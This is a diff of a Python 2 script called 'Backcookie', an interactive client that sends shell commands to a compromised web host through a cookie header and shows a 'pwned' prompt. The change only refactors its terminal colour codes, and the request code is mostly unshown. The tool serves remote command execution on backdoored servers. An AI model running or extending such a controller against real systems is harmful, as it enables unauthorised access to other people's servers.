@@ -37,27 +37,20 @@ else:
 
 _version_ = "1.0.3"
 
-# colors
-class color:
-    blue = '\033[94m'
-    red = '\033[91m'
-    green = '\033[92m'
-    white = '\033[0m'
-    yellow = '\033[93m'
-
-# class of header and encode
+# class of header, encode and colors
 class core:
     bc = 'Backcookie'
     ua = 'User-Agent'
     ck = 'Cookie'
     eb = 'base64'
+    cl = {"blue": "\033[94m", "red": "\033[91m", "green": "\033[92m", "white": "\033[0m", "yellow": "\033[93m"}
 
 def Error():
-	print color.white + "\t\t-------------" + color.red + core.bc + color.white + "------------"
+	print core.cl['white'] + "\t\t-------------" + core.cl['red'] + core.bc + core.cl['white'] + "------------"
 	print "\t\t+             Status              +"
 	print "\t\t+             sorry :(            +"
 	print "\t\t-----------------------------------\n\n"
-	print color.blue + "[-] " + color.red  + "Error:" +  color.yellow + " " + "Connection! \n" + color.white
+	print core.cl['blue'] + "[-] " + core.cl['red']  + "Error:" +  core.cl['yellow'] + " " + "Connection! \n" + core.cl['white']
 	exit(0)
 
 def backcookie(command, host, cookie, vcmd):
@@ -71,19 +64,19 @@ def backcookie(command, host, cookie, vcmd):
 	except:
 		Error()
 	if v[0] == "0" or vcmd == "command": # vcmd > validate command
-		print color.blue + r.text.strip() + color.white
+		print core.cl['blue'] + r.text.strip() + core.cl['white']
 	else:
 		Error()
 
 def shell(host, cookie):
 	backcookie("cd",host,cookie,"")
 
-	print color.white + "\t\t-------------" + color.red + core.bc + color.white + "------------"
+	print core.cl['white'] + "\t\t-------------" + core.cl['red'] + core.bc + core.cl['white'] + "------------"
 	print "\t\t+    Developed by: @mrjopino      +"
 	print "\t\t+             To play             +"
 	print "\t\t-----------------------------------\n\n"
-	print color.green + "[+] " + color.blue  + "Happy hacking" + color.white
-	print color.green + "[+] " + color.blue  + "Sometimes it is not positive, but sometimes if!\n" + color.white
+	print core.cl['green'] + "[+] " + core.cl['blue']  + "Happy hacking" + core.cl['white']
+	print core.cl['green'] + "[+] " + core.cl['blue']  + "Sometimes it is not positive, but sometimes if!\n" + core.cl['white']
 
 	opu = urllib.urlopen(host) # opu > openurl
 	server = opu.headers.get("server")
@@ -96,24 +89,24 @@ def shell(host, cookie):
 			backcookie(command,host,cookie,"command")
 		else:
 			print "\n"
-			print color.yellow + "[*] " + color.white  + "Information" + color.white
-			print color.yellow + "[!] " + color.green  + "Host: " + color.blue + domain + color.white
-			print color.yellow + "[!] " + color.green  + "WebServer: " + color.blue + server + color.white
-			print color.yellow + "[!] " + color.green  + "Target: " + color.blue + host + color.white
-			print color.yellow + "[!] " + color.green  + "Cookie: " + color.blue + cookie + color.white
+			print core.cl['yellow'] + "[*] " + core.cl['white']  + "Information" + core.cl['white']
+			print core.cl['yellow'] + "[!] " + core.cl['green']  + "Host: " + core.cl['blue'] + domain + core.cl['white']
+			print core.cl['yellow'] + "[!] " + core.cl['green']  + "WebServer: " + core.cl['blue'] + server + core.cl['white']
+			print core.cl['yellow'] + "[!] " + core.cl['green']  + "Target: " + core.cl['blue'] + host + core.cl['white']
+			print core.cl['yellow'] + "[!] " + core.cl['green']  + "Cookie: " + core.cl['blue'] + cookie + core.cl['white']
 			print "\n"
 
 		command = raw_input("@" + "pwned:~$ ")
 		if command != "exit": #exit console backcookie
 			backcookie(command,host,cookie,"command")
 		else:
-			print "\t\t-------------" + color.blue + "Developer" + color.white + "------------"
+			print "\t\t-------------" + core.cl['blue'] + "Developer" + core.cl['white'] + "------------"
 			print "\t\t+        José Pino (Fraph)       +"
 			print "\t\t+       Security researcher      +"
 			print "\t\t+            @mrjopino           +"
 			print "\t\t----------------------------------\n\n"
-			print color.green + "[!] " + color.blue + "Version:" + " " + color.yellow + _version_ + color.white
-			print color.blue + "[-] " + color.red + core.bc + " OFF\n" + color.white
+			print core.cl['green'] + "[!] " + core.cl['blue'] + "Version:" + " " + core.cl['yellow'] + _version_ + core.cl['white']
+			print core.cl['blue'] + "[-] " + core.cl['red'] + core.bc + " OFF\n" + core.cl['white']
 			break
 
 def main():
@@ -133,7 +126,7 @@ if __name__ == "__main__":
         try:
         	main()
         except KeyboardInterrupt:
-        	sys.exit(color.blue + "\n\n[-] " + color.green + "Status: " + color.red + "close!\n" + color.white) #Ctrl + c = close
+        	sys.exit(core.cl['blue'] + "\n\n[-] " + core.cl['green'] + "Status: " + core.cl['red'] + "close!\n" + core.cl['white']) #Ctrl + c = close
                 pass
         except Exception as ke:
-        	sys.exit(color.red + "Error: " + color.blue + "%s" % ke + color.white) #Result of error
+        	sys.exit(core.cl['red'] + "Error: " + core.cl['blue'] + "%s" % ke + core.cl['white']) #Result of error
